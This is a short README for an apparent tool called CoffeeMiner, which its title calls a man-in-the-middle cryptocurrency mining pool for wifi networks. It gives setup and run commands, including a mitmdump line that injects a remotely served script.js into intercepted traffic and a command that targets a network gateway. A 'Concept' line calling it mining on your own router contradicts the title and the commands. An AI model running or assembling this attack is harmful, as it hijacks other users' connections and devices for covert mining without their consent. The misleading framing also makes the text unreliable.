# CoffeeMiner

Collaborative (mitm) cryptocurrency mining pool in wifi networks

**Warning: this project is for academic/research purposes only.**

## Concept
- Creating a mining algo to run on your Lan network, and use your router to mine while you aren't using your internet


## Use
- install.sh
```
bash install.sh
```
- edit routersip.txt with one IP per line
- edit coffeeMiner.py, line 28, with the coffeeMiner httpserver IP:
```py
os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
```
- execute coffeeMiner.py
```
python3 coffeeMiner.py ipgateway
```
![demo](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-demo-cutted.gif "demo")
